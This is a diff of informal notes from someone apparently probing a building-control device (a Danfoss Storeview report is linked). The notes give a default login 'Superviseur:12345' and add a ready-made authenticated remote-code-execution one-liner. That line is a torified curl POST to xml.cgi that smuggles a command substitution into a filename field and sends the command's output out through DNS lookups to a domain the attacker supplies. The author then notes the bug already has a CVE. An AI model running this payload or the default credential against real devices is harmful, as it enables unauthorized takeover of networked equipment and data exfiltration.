@@ -13,3 +13,13 @@ there is a default password (Superviseur:12345)
 if there's a ssh exposed, you have a shell :p
 
 attached scan.sh
+
+Found an authenticated RCE too..
+
+torify timeout 5 curl -s -k -X POST  "$1/xml.cgi" -d "%3Ccmd%20user%3D%22$4%22%20password%3D%22$5%22%20lang%3D%22fre%22%20action%3D%22load_cert%22%20done%3D%221%22%20index%3D%221%22%20filename%3D%22\$(nslookup%20\$($2).$3).pem%22%20offset%3D%224%22%3E%0A%20%20%3Cb64%3EdGVzdA%3D%3D%3C%2Fb64%3E%0A%3C%2Fcmd%3E"
+
+then it seems that some are already pathed.. strangely.. THEN i looked for recent cve on this and i understood that it was already found by synactiv and even have a CVE.. XD
+https://www.synacktiv.com/sites/default/files/2023-05/Synacktiv-Danfoss-Storeview-Multiple-Vulnerabilities.pdf
+
+fuck me.. was still fun ^^
+
